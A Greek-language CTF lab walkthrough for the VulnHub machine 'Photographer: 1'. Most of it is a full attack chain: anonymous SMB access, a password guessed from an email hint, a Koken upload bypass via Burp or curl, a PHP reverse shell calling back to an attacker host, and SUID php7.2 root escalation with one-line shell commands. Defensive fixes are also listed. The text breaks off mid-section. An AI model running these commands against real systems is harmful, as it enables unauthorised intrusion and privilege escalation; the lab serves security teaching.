# Μηχάνημα 11 — Photographer: 1

> **Θέση:** 11 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **055** από 708)
> **Πλήρες walkthrough:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Photographer: 1 |
| **Δημιουργός** | Vinícius Vieira («v1n1v131r4») |
| **Κυκλοφορία** | 21 Ιουλίου 2020 |
| **Σύμβαση** | **2 σημαίες** — `/home/daisa/user.txt`, `/root/proof.txt` |
| **Στόχος** | **Ubuntu 16.04 (EOL)** — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **VulnHub** | [entry/photographer-1,519](https://vulnhub.com/entry/photographer-1,519/) |
| **Εκτιμώμενος χρόνος** | 4–6 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή **ξεκινά ΕΝΤΕΛΩΣ ΜΑΚΡΙΑ από τον web εξυπηρετητή.**

Το foothold **δεν** είναι ευπάθεια στον κώδικα — είναι **ένα ανώνυμο SMB share που περιέχει
πραγματική εταιρική αλληλογραφία**. Και το διαπιστευτήριο που χρειάζεστε **δεν βρίσκεται σε
κανένα λεξικό**. **ΣΥΜΠΕΡΑΙΝΕΤΑΙ από ένα email:**

> *«Μην ξεχάσεις το μυστικό σου, κοριτσάκι μου ;)»*

**Αυτό διδάσκει μια δεξιότητα που κανένα άλλο μηχάνημα στη διαδρομή δεν διδάσκει: να διαβάζετε
διαρρεύσαντα έγγραφα για ό,τι ΥΠΟΝΟΟΥΝ, όχι μόνο για ό,τι ΔΗΛΩΝΟΥΝ.**

**Οι πραγματικές έρευνες παραβίασης είναι γεμάτες από αυτό** — ένα συνημμένο, ένα ticket, ένα
προωθημένο email, **και έναν κωδικό που κανείς δεν θα μάντευε ποτέ από λίστα.**

**Μετά** σας δίνει **μια παράκαμψη upload CMS με ΔΗΜΟΣΙΑ καταχώριση στο Exploit-DB** (Koken
0.22.24, **EDB 48706**) που **απαιτεί παρεμβολή Burp Suite** για να **μεταλλάξετε την αίτηση
εν πτήσει** — **και τελειώνει με SUID σε έναν ΔΙΕΡΜΗΝΕΑ PHP**, **ένα binary που δεν θα
σκεφτόσασταν να ελέγξετε.**

## Στόχοι μάθησης

1. Να κάνετε **σωστή αναρίθμηση SMB** και να ερμηνεύσετε **`READ ONLY`** έναντι **`NO ACCESS`**
   στην έξοδο του `smbmap`.
2. Να **διαβάσετε διαρρεύσαντα έγγραφα για συνεπαγόμενα διαπιστευτήρια** — και να φτιάξετε
   **θεματικό** λεξικό, όχι **μεγαλύτερο**.
3. Να **επιθεωρήσετε τα περιεχόμενα ενός backup ΠΡΙΝ** υποθέσετε ότι διαρρέει διαπιστευτήρια.
4. Να κάνετε **fingerprint έκδοσης πρώτα, έρευνα μετά** — και να ταιριάξετε **ακριβή** έκδοση σε
   **EDB**.
5. Να **διαβάσετε μια καταχώριση Exploit-DB** και να βρείτε **την πρόταση-κλειδί** («έλεγχος στην
   πλευρά του **ΠΕΛΑΤΗ**»).
6. Να χρησιμοποιήσετε **παρεμβολή proxy** για να **μεταλλάξετε μια αίτηση εν πτήσει**.
7. Να **διαβάσετε μια απόκριση JSON** ως επιβεβαίωση — και να βρείτε τη **διαδρομή αποθήκευσης**.
8. Να **σαρώσετε SUID σε ΔΙΕΡΜΗΝΕΑ γλώσσας** (`php7.2`) και να καταλάβετε **`pcntl_exec`**.
9. Να καταλάβετε τι σημαίνει **`euid=0`** σε κέλυφος από SUID.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Ανώνυμο SMB share** | `sambashare` → **`READ ONLY`** (έναντι `NO ACCESS` στα άλλα) |
| **Διαρροή εταιρικής αλληλογραφίας** | **`mailsent.txt`** — δύο emails + υπόδειξη κωδικού |
| **Συνεπαγόμενο διαπιστευτήριο** | **«your babygirl's name»** → **`babygirl`** |
| **Decoy backup** | **`wordpress.bkp.zip`** (12 MB) — **μόνο το stock sample, ΟΧΙ `wp-config.php`** |
| **Εύρεση σε άλλη θύρα** | **Δύο** web servers: **:80** (στατικό portfolio) και **:8000** (εφαρμογή) |
| **Fingerprint CMS** | **Koken 0.22.24** + **PHP 7.2.24** + cookie `koken_session_ci` |
| **Δημόσιο exploit** | **EDB 48706** — Arbitrary File Upload, **έλεγχος πλευράς ΠΕΛΑΤΗ** |
| **Παρεμβολή proxy** | **Burp** → `filename="shell.php.jpg"` → **`filename="shell.php"`** |
| **Εκτέλεση επί τόπου** | **`/storage/originals/3c/13/shell.php`** — **μέσα στο document root** |
| **Πραγματικό όριο** | **`user.txt` mode 600** — **το `www-data` ΔΕΝ το διαβάζει** |
| **SUID σε διερμηνέα** | **`/usr/bin/php7.2`** → **`pcntl_exec('/bin/sh',['-p'])`** → **`euid=0`** |

## Διαβάστε πρώτα

- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) — **§2** (SMB: **`smbmap`,
  `smbclient`, και τι σημαίνει κάθε στήλη**) και **§7** (έρευνα exploits).
- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§8** (upload filters: **όλοι οι
  πίνακες παράκαμψης**) και **§6** (curl / `-F` / `-b`).
- [04 — Διαπιστευτήρια και Σπασίματα](<../04-Διαπιστευτήρια-και-Σπασίματα.md>) — **§5**
  (θεματικά λεξικά με `cewl`).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§2** (SUID —
  **συμπεριλαμβανομένων των διερμηνέων**) και **§3** (GTFOBins).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2** και **§3**.
- Αγγλική έκδοση:
  [Machine 11](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/11-photographer-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Αν το `smbmap` δείξει **`READ ONLY`** σε ένα share και **`NO ACCESS`** σε άλλα, τι κάνετε
   πρώτα;
2. Γιατί **δεν** αρκεί ένα μεγάλο λεξικό για έναν κωδικό που **υπονοείται** από email;
3. Αν ένα backup 12 MB βρίσκεται σε ανώνυμο share, τι ελέγχετε **πριν** ενθουσιαστείτε;
4. Τι σημαίνει «ο έλεγχος επέκτασης γίνεται στην πλευρά του **ΠΕΛΑΤΗ**»;
5. Γιατί ένας **SUID διερμηνέας PHP** είναι πιο επικίνδυνος από ένα **SUID `find`**;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

**Τέσσερις θύρες: 80, 139, 445, 8000.**

**Οι ΔΥΟ web servers είναι ΔΥΟ ΔΙΑΦΟΡΕΤΙΚΑ sites:**
- **:80** → **στατικό portfolio** (`Photographer by v1n1v131r4`)
- **:8000** → **εφαρμογή** (`daisa ahomi`), **και το NSE `http-robots.txt` ΔΙΑΒΑΣΕ ΗΔΗ το
  `robots.txt`** και τυπώνει τη **μοναδική** disallowed καταχώριση: **`/admin/`**

**Το `-p-` ΕΙΧΕ σημασία:** *μια εφαρμογή στο 8000 με τίποτα ενδιαφέρον στο 80 είναι πολύ συχνό
σχήμα CTF, και μια προεπιλεγμένη σάρωση σας προσκαλεί να τα παρατήσετε.*

**Και το SMB:** **`sambashare` → `READ ONLY`**. **Ξεκινήστε από εκεί.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -sC -sV -p- TARGET → 80, 139, 445, 8000 (+ /admin/ από το robots.txt)
 2. smbmap -u guest -H TARGET
    → sambashare  **READ ONLY**   (print$ και IPC$ = NO ACCESS)
 3. smbclient //TARGET/sambashare -N → dir
    → mailsent.txt (503 B) · wordpress.bkp.zip (12 MB)
 4. get mailsent.txt → **ΔΥΟ emails + «your babygirl's name»**
 5. unzip -l wordpress.bkp.zip → **ΜΟΝΟ wp-config-sample.php** ← **DECOY**
 6. curl -s http://TARGET:8000/ | grep -io koken → **Koken 0.22.24**
 7. searchsploit koken → **php/webapps/48706.txt**
    → **«checks the file extension on the CLIENT side»**
 8. Σύνδεση στο /admin/: **daisa@photographer.com / babygirl**
 9. Library → Import content + **Burp intercept**
    → filename="shell.php.jpg" → **μετάλλαξη σε "shell.php"** → Forward
10. Απόκριση JSON: {"filename":"shell.php","storage":{…}} → /storage/originals/3c/13/shell.php
11. nc -lvnp 4444 + curl στη διαδρομή → www-data
12. cat /home/daisa/user.txt → **Permission denied** (mode 600)
13. su daisa (babygirl) → **user.txt**
14. find / -perm -4000 -type f 2>/dev/null → **/usr/bin/php7.2**
15. /usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);" → **euid=0**
16. cat /root/proof.txt
```
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — πώς φτιάχνετε ΘΕΜΑΤΙΚΟ λεξικό</strong></summary>

**Αν το `babygirl` δεν δούλευε, η σωστή κλιμάκωση είναι μια ΘΕΜΑΤΙΚΗ λίστα, όχι μια
ΜΕΓΑΛΥΤΕΡΗ:**

```bash
cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa Daisa daisaahomi \
              'babygirl2020' secret 'mybabygirl' >> daisa_words.txt
sort -u daisa_words.txt -o daisa_words.txt
```

| Τμήμα | Ρόλος |
| --- | --- |
| **`cewl -d 2 -m 3`** | **Θερίζει λέξεις ≥ 3 χαρακτήρων από ΔΥΟ άλματα του site** — **ακριβώς το λεξιλόγιο που θα χρησιμοποιούσε ένας δημιουργός που θεματίζει ένα κουτί γύρω από μια οικογένεια** |
| **`printf '%s\n' A B C >>`** | **Προσθέτει τις ΜΕΤΑΤΡΟΠΕΣ** — πεζά/κεφαλαία, σημείωση, έτος, σύνθετη |
| **`sort -u … -o`** | **Αφαιρεί διπλότυπα ΕΠΙ ΤΟΠΟΥ με ασφάλεια** (το `sort -u f > f` **καταστρέφει** το αρχείο) |

**Οι τυπικές μετατροπές που πρέπει ΠΑΝΤΑ να παράγετε:**

```text
base           → babygirl
Κεφαλαίο πρώτο → Babygirl
ΟΛΑ ΚΕΦΑΛΑΙΑ   → BABYGIRL
+ σημείωση     → babygirl!  babygirl;  babygirl.
+ έτος         → babygirl2020  babygirl2016
+ όνομα        → daisababygirl
σύνθετο        → mybabygirl
leet           → b4byg1rl
```

**Αυτό είναι το δίδαγμα:** *όταν μια υπόδειξη λέει «το όνομα του X», το λεξικό σας πρέπει να
είναι 20 λέξεις γύρω από το X — όχι 14 εκατομμύρια γενικές.*
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — η μετάλλαξη μέσω Burp</strong></summary>

**Η πρόταση-κλειδί στο EDB 48706:**

> *«The import function checks the file extension on the **CLIENT** side»*

**Δηλαδή:** το **JavaScript του φυλλομετρητή** απορρίπτει το `.php` — **αλλά ο εξυπηρετητής
ΟΧΙ**. **Άρα η διόρθωση δεν είναι ένα έξυπνο όνομα αρχείου: είναι να ΣΤΕΙΛΕΤΕ αυτό που ο
φυλλομετρητής αρνήθηκε να στείλει.** **Και αυτό σημαίνει παρεμβαλλόμενο proxy.**

**Βήματα:**

```text
1. Burp → Proxy → Intercept ON
2. Φυλλομετρητής → proxy 127.0.0.1:8080
3. Koken admin → Library → Import content → ανεβάστε shell.php.jpg
4. Η αίτηση ΠΑΓΩΝΕΙ στο Burp
5. Βρείτε:  Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
6. Αλλάξτε σε:                                  filename="shell.php"
7. Forward
```

**Ο έλεγχος πλευράς πελάτη ΕΧΕΙ ΗΔΗ ΤΡΕΞΕΙ** — **στον φυλλομετρητή, πριν η αίτηση φύγει από το
μηχάνημά σας**. **Άρα ο εξυπηρετητής λαμβάνει ένα όνομα `.php` που ΔΕΝ ΕΠΙΚΥΡΩΣΕ ποτέ.**

**Εναλλακτική χωρίς Burp** (με `curl`):

```bash
curl -s -b cookies.txt -F "files[]=@shell.php;filename=shell.php;type=image/jpeg" \
  http://TARGET:8000/admin/users/import
```

**Το `;filename=` μέσα στο `-F`** **επικαλύπτει** το όνομα που η curl θα έστελνε. **Το
`;type=image/jpeg`** **επικαλύπτει** το MIME. **Έτσι περνάτε και τους δύο ελέγχους.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
smbmap -u guest -H TARGET
smbclient //TARGET/sambashare -N
# → dir · get mailsent.txt · get wordpress.bkp.zip · exit
cat mailsent.txt

curl -s http://TARGET:8000/ | grep -io 'koken[^"]*'
searchsploit koken && searchsploit -m php/webapps/48706.txt

# Σύνδεση: daisa@photographer.com / babygirl
# Burp: filename="shell.php.jpg" → "shell.php"

cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php && sed -i "s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php
cp shell.php shell.php.jpg

nc -lvnp 4444
curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
python3 -c 'import pty; pty.spawn("/bin/bash")'

su daisa                     # babygirl
cat /home/daisa/user.txt

find / -perm -4000 -type f 2>/dev/null | grep -iE 'php|python|perl|ruby|node'
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);"
id                           # → euid=0(root)
cat /root/proof.txt
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Διαβάστε την έξοδο του <code>smbmap</code> ως πίνακα αποφάσεων.</b></summary>

```text
[+] Guest session       IP: 192.168.56.122:445    Name: 192.168.56.122
        Disk                                    Permissions     Comment
        ----                                    -----------     -------
        print$                                  NO ACCESS       Printer Drivers
        sambashare                              READ ONLY       Samba on Ubuntu
        IPC$                                    NO ACCESS       IPC Service
```

| Στήλη | Τι σημαίνει |
| --- | --- |
| **`[+] Guest session`** | **Η ανώνυμη σύνδεση ΕΠΙΤΡΕΠΕΤΑΙ** — **αυτό είναι ήδη εύρημα** |
| **`NO ACCESS`** | **Δεν μπορείτε ούτε να καταγράψετε τα περιεχόμενα** |
| **`READ ONLY`** | **Μπορείτε να ΔΙΑΒΑΣΕΤΕ** |
| **`READ, WRITE`** | **Μπορείτε να ΓΡΑΨΕΤΕ** ← **το jackpot** |

**Η στήλη `Permissions` απαντά τη ΜΟΝΗ ερώτηση που έχει σημασία: μπορείτε να το διαβάσετε, και
μπορείτε να γράψετε σε αυτό;**

**Γι' αυτό το `smbmap` είναι η πιο γρήγορη πρώτη ματιά** — **το `smbclient -L` τυπώνει τη λίστα
αλλά ΟΧΙ τα δικαιώματά σας.**

**Και το `IPC$` είναι `NO ACCESS` εδώ** — **άρα ΔΕΝ μπορείτε να κάνετε RID cycling όπως στο
Μηχάνημα 8.** **Δύο διαφορετικές ρυθμίσεις Samba, δύο διαφορετικές επιθέσεις.**
</details>

<details>
<summary><b>2.</b> Διαβάστε το <code>mailsent.txt</code> ως ΟΛΟΚΛΗΡΟ το foothold.</b></summary>

```text
Message-ID: <4129F3CA.2020509@dc.edu>
From: Agi Clarence <agi@photographer.com>
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii;

Hi Daisa!
Your website is ready. Login with your email and your password.
Don't forget your password is your babygirl's name :)
-- Agi
```

**Τρία πράγματα, και τα τρία είναι το foothold:**

1. **Δύο διευθύνσεις email** — **και το `To:` είναι η διαχειρίστρια**
2. **«Login with your email»** — **η εφαρμογή δέχεται EMAIL, όχι username.** **Αυτό αλλάζει τι
   πληκτρολογείτε στη φόρμα**
3. **«your babygirl's name»** — **ΥΠΟΔΕΙΞΗ κωδικού, όχι κωδικός**

**Αυτό είναι το δίδαγμα: ένας κωδικός που ΣΥΜΠΕΡΑΙΝΕΤΑΙ δεν είναι σε κανένα λεξικό.**
**`babygirl` υπάρχει στο `rockyou.txt`** — **αλλά αν δοκιμάζατε 14 εκατομμύρια κωδικούς χωρίς
την υπόδειξη, θα χανόσασταν στη φασαρία.**

**Και για την άμυνα:** *ποτέ εταιρική αλληλογραφία σε share προσβάσιμο από guests.* **Η
ταξινόμηση δεδομένων έχει μεγαλύτερη σημασία από οποιονδήποτε μεμονωμένο τεχνικό έλεγχο.**
</details>

<details>
<summary><b>3.</b> Τι σας διδάσκει το decoy backup;</b></summary>

```bash
unzip -l wordpress.bkp.zip | head -20
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i 'define\|password'
```

```text
Archive:  wordpress.bkp.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     5434  2020-07-20 12:11   wordpress/wp-config-sample.php
   405431  2020-07-20 12:11   wordpress/wp-admin/edit.php
```
```text
(κανένα wp-config.php στο archive — μόνο το stock sample)
```

**Ένα backup WordPress 12 MB σε ανώνυμο share ΜΟΙΑΖΕΙ με jackpot.**

| Flag | Ρόλος |
| --- | --- |
| **`-l`** | **Λίστα περιεχομένων ΧΩΡΙΣ εξαγωγή** — **γρήγορο, και αποφεύγει να γράψετε 12 MB αρχεία που δεν χρειάζεστε** |
| **`-p FILE`** | **Τυπώνει ΕΝΑ μέλος στο stdout** — ώστε να το **grep-άρετε κατευθείαν** |

**Δύο διδάγματα:**

1. **Πάντα επιθεωρείτε τα ΠΕΡΙΕΧΟΜΕΝΑ ενός backup πριν υποθέσετε ότι διαρρέει διαπιστευτήρια.**
2. **Σημειώστε ότι τα ΠΡΑΓΜΑΤΙΚΑ backups ΡΟΥΤΙΝΑ περιέχουν `wp-config.php`, `.env`, `id_rsa`
   και `*.sql`** — **άρα αυτό εξακολουθεί να είναι εύρημα επιπέδου αναφοράς, ακόμα κι αν εδώ
   είναι άδειο.**

**`wp-config-sample.php` είναι το ΑΡΧΕΙΟ ΔΕΙΓΜΑΤΟΣ που έρχεται με κάθε WordPress** — **δεν
περιέχει πραγματικά διαπιστευτήρια.** **Η αναγνώριση του «sample» είναι το δίδαγμα.**
</details>

<details>
<summary><b>4.</b> Γιατί «έλεγχος στην πλευρά του ΠΕΛΑΤΗ» σημαίνει ότι το φίλτρο ΔΕΝ υπάρχει;</b></summary>

Επειδή **ο πελάτης είναι ο επιτιθέμενος.**

**Έλεγχος πλευράς πελάτη = JavaScript στον φυλλομετρητή.** **Ο επιτιθέμενος:**
- **μπορεί να τον ΑΠΕΝΕΡΓΟΠΟΙΗΣΕΙ** (DevTools → disable JavaScript)
- **μπορεί να τον ΠΑΡΑΚΑΜΨΕΙ** (αντί να χρησιμοποιήσει τον φυλλομετρητή, στέλνει την αίτηση
  **μόνος του** με `curl`)
- **μπορεί να τον ΜΕΤΑΛΛΑΞΕΙ εν πτήσει** (Burp)

**Άρα ένας έλεγχος που τρέχει στον πελάτη είναι ΑΝΥΠΑΡΚΤΟΣ ως έλεγχος ασφαλείας.**
**Είναι ΜΟΝΟ έλεγχος χρηστικότητας** — **για να μην κουράζεται ο χρήστης με λάθη εξυπηρετητή.**

**Ο κανόνας:** *κάθε έλεγχος ασφαλείας πρέπει να τρέχει στον ΕΞΥΠΗΡΕΤΗ.* **Ο έλεγχος πελάτη
μπορεί να υπάρχει ΕΠΙΠΛΕΟΝ, για UX — ποτέ ΑΝΤΙ.**

**Και εδώ το EDB το λέει ρητά.** **Αυτή είναι η πρόταση-κλειδί που πρέπει να βρείτε όταν
διαβάζετε μια καταχώριση exploit:** *πού ακριβώς είναι ο έλεγχος;*
</details>

<details>
<summary><b>5.</b> Γιατί ο SUID <code>php7.2</code> είναι πιο επικίνδυνος από SUID <code>find</code>;</b></summary>

Επειδή **ο διερμηνέας είναι ΓΕΝΙΚΗ ΜΗΧΑΝΗ ΕΚΤΕΛΕΣΗΣ.**

**Το SUID `find`:**
- Έχει **ΜΙΑ** διαφυγή: **`-exec`**
- **Μόλις την αφαιρέσετε** (`find` χωρίς `-exec`), **το binary είναι άχρηστο**

**Ο SUID `php7.2`:**
- **Εκτελεί ΟΠΟΙΟΝΔΗΠΟΤΕ κώδικα PHP του δώσετε** με **`-r`**
- **Έχει πρόσβαση σε ΟΛΟΚΛΗΡΗ τη γλώσσα**: **`pcntl_exec`, `system`, `exec`, `passthru`,
  `file_put_contents`, `fopen`, sockets**
- **Κάθε συνάρτηση PHP είναι και μια διαφυγή**

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);"
```

| Τμήμα | Ρόλος |
| --- | --- |
| **`-r "CODE"`** | **Εκτέλεσε αυτόν τον κώδικα PHP** χωρίς αρχείο |
| **`pcntl_exec('/bin/sh', …)`** | **ΑΝΤΙΚΑΤΑΣΤΗΣΕ την τρέχουσα διεργασία** με `/bin/sh` (**`execve`**) — **άρα το νέο κέλυφος ΚΛΗΡΟΝΟΜΕΙ το euid=0** |
| **`['-p']`** | **Όρισμα στο `sh`: preserve privileges** — **χωρίς αυτό το bash/sh ΡΙΧΝΕΙ το euid** |

**`pcntl_exec` αντί για `system`:** **το `system()` κάνει FORK**, άρα **το παιδί κληρονομεί το
euid** — **αλλά ορισμένα συστήματα ρίχνουν τα προνόμια στο fork.** **Το `pcntl_exec` κάνει
EXEC στην ΙΔΙΑ διεργασία** — **πιο αξιόπιστο.**

**Αν το `pcntl` δεν είναι μεταγλωττισμένο μέσα:**

```bash
/usr/bin/php7.2 -r "system('/bin/sh -p');"
/usr/bin/php7.2 -r "exec('/bin/sh -p');"
/usr/bin/php7.2 -r "popen('/bin/sh -p','r');"
```

**Η αρχή:** *οποιοσδήποτε διερμηνέας με SUID είναι ισοδύναμος με SUID shell.* **`python`,
`perl`, `ruby`, `node`, `lua`, `awk`, `vim`, `less` — όλα.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Ανώνυμο SMB share** | **`restrict anonymous = 2`** + **`map to guest = never`** |
| **Εταιρική αλληλογραφία σε share** | **Ταξινόμηση δεδομένων.** Ποτέ email/backup σε guest share |
| **Decoy backup 12 MB** | **Σε παραγωγή: ποτέ backups στον web/share χώρο** |
| **Κωδικός = λέξη από email** | **Πολιτική μήκους ≥ 12 + 2FA.** Ένας **υπαινιγμός** δεν πρέπει να είναι αρκετός |
| **Koken 0.22.24 (EDB 48706)** | **Ενημέρωση ή αντικατάσταση CMS.** Το Koken **δεν συντηρείται** |
| **Έλεγχος upload στον πελάτη** | **Έλεγχος στον ΕΞΥΠΗΡΕΤΗ**: whitelist επεκτάσεων + **επανεκκωδικοποίηση εικόνας** + **αποθήκευση ΕΚΤΟΣ web root** |
| **`storage/originals/` μέσα στο document root** | **Μεταφορά ΕΞΩΣ** + **εξυπηρέτηση μέσω σεναρίου** με **`Content-Disposition: attachment`** |
| **Apache handler για `.php` παντού** | **`<Directory /var/www/html/storage> php_flag engine off </Directory>`** |
| **Ubuntu 16.04 (EOL Απρίλιος 2021)** | **Αναβάθμιση διανομής.** Κανένα patch μετά το EOL |
| **SUID `/usr/bin/php7.2`** | **`chmod u-s /usr/bin/php7.2`**. **Κανένας διερμηνέας δεν πρέπει να έχει SUID** |
| **`user.txt` mode 600** | **ΣΩΣΤΟ!** — **αυτό είναι το μόνο πράγμα που δουλεύει σωστά στο μηχάνημα** |

**Το μεγαλύτερο δίδαγμα:** *η πιο αδύναμη άμυνα δεν είναι τεχνική — είναι διαδικαστική.* **Το
μηχάνημα σπάει επειδή κάποιος **έστειλε email με υπαινιγμό κωδικού** και **το άφησε σε ένα
ανώνυμο share**. **Καμία τεχνική διόρθωση δεν το αποτρέπει.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.122**, `ATTACKER` = **192.168.56.10**.

### 1. Σάρωση

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

```text
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: daisa ahomi
| http-robots.txt: 1 disallowed entry
|_/admin/
Service Info: Host: PHOTOGRAPHER
```

**Δύο web servers, ΔΥΟ ΔΙΑΦΟΡΕΤΙΚΑ sites.**

- **Η θύρα 80** είναι **στατικό portfolio**
- **Η θύρα 8000** είναι **εφαρμογή** — **και το NSE script `http-robots.txt` ΔΙΑΒΑΣΕ ΗΔΗ το
  `robots.txt` για εσάς** και τυπώνει **τη μοναδική disallowed καταχώριση: `/admin/`**

**Το `-p-` ΕΙΧΕ σημασία:** *μια εφαρμογή στο 8000 με τίποτα ενδιαφέρον στο 80 είναι πολύ συχνό
σχήμα CTF, και μια προεπιλεγμένη σάρωση (μόνο οι 1000 κοινές θύρες) σας προσκαλεί να τα
παρατήσετε.*

**`Samba smbd 3.X - 4.X` στη 139** έναντι **`4.3.11-Ubuntu` στην 445** — **η 139 δεν δίνει ακριβή
έκδοση** γιατί το **NetBIOS session service** απαντά **διαφορετικά**. **Η 445 είναι αυτή που
μετράει.**

**`Service Info: Host: PHOTOGRAPHER`** — **το nmap διάβασε το hostname από το NetBIOS**, **χωρίς
DNS**.

### 2. SMB: πρώτα το ανώνυμο share

```bash
smbmap -u guest -H TARGET
smbclient -L //TARGET -N
```

```text
[+] Guest session       IP: 192.168.56.122:445    Name: 192.168.56.122
        Disk                                    Permissions     Comment
        ----                                    -----------     -------
        print$                                  NO ACCESS       Printer Drivers
        sambashare                              READ ONLY       Samba on Ubuntu
        IPC$                                    NO ACCESS       IPC Service
```
```text
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Server               Comment
---------            -------
PHOTOGRAPHER
Workgroup            Master
---------            -------
WORKGROUP            PHOTOGRAPHER
```

**Το `smbmap` είναι η πιο γρήγορη πρώτη ματιά** γιατί **η στήλη `Permissions` απαντά τη μοναδική
ερώτηση που έχει σημασία — μπορείτε να το διαβάσετε, και μπορείτε να γράψετε σε αυτό;**

| Flag | Ρόλος |
| --- | --- |
| **`-u guest`** | **«session guest, χωρίς κωδικό»** |
| **`-H TARGET`** | **Host** |
| **`smbclient -L … -N`** | **`-L`** = λίστα shares · **`-N`** = **NULL session, χωρίς διαπιστευτήρια** |

```bash
smbclient //TARGET/sambashare -N
```

```text
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 21 03:29:40 2020
  ..                                  D        0  Tue Jul 21 03:29:30 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020

                18113516 blocks of size 1024. 9417264 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
getting file \wordpress.bkp.zip of size 12666609 as wordpress.bkp.zip (11875.4 KiloBytes/sec) (average 11454.8 KiloBytes/sec)
smb: \> exit
```

| Εντολή | Ρόλος |
| --- | --- |
| **`dir`** | **Καταγραφή** — **το `D` = κατάλογος, `N` = κανονικό αρχείο** |
| **`get FILE`** | **Κατεβάζει στον ΤΡΕΧΟΝΤΑ κατάλογό σας** |
| **`prompt`** | **Εναλλάσσει την επιβεβαίωση ανά αρχείο** |
| **`recurse` + `mget *`** | **Θα έφερνε ΟΛΟΚΛΗΡΟ το δέντρο** |
| **`exit`** | **Έξοδος** |

**`12666609` bytes = 12 MB** — **ένα μεγάλο backup.** **Αλλά ΔΕΙΤΕ τα περιεχόμενα ΠΡΙΝ
ενθουσιαστείτε.**

```bash
cat mailsent.txt
```

```text
Message-ID: <4129F3CA.2020509@dc.edu>
From: Agi Clarence <agi@photographer.com>
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii;

Hi Daisa!
Your website is ready. Login with your email and your password.
Don't forget your password is your babygirl's name :)
-- Agi
```

**Διαβάστε αυτό το email ως ΟΛΟΚΛΗΡΟ το foothold.** **Σας δίνει:**

1. **Δύο διευθύνσεις email**
2. **Τη γνώση ότι η διαχειρίστρια ΣΥΝΔΕΕΤΑΙ ΜΕ EMAIL, όχι με username**
3. **Τη δήλωση ότι ο κωδικός είναι «το όνομα του κοριτσιού σας»**

**Αυτό είναι ΥΠΟΔΕΙΞΗ κωδικού** — **και γι' αυτό η λίστα μαντεψιών είναι ΣΥΝΤΟΜΗ και ΘΕΜΑΤΙΚΗ,
όχι ένα λεξικό 14 εκατομμυρίων γραμμών.**

**Ποτέ εταιρική αλληλογραφία σε share προσβάσιμο από guests** — **η ταξινόμηση δεδομένων έχει
μεγαλύτερη σημασία από οποιονδήποτε μεμονωμένο τεχνικό έλεγχο.**

### 3. Το decoy backup

```bash
unzip -l wordpress.bkp.zip | head -20
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i 'define\|password'
```

```text
Archive:  wordpress.bkp.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     5434  2020-07-20 12:11   wordpress/wp-config-sample.php
   405431  2020-07-20 12:11   wordpress/wp-admin/edit.php
   384723  2020-07-20 12:11   wordpress/wp-admin/post.php
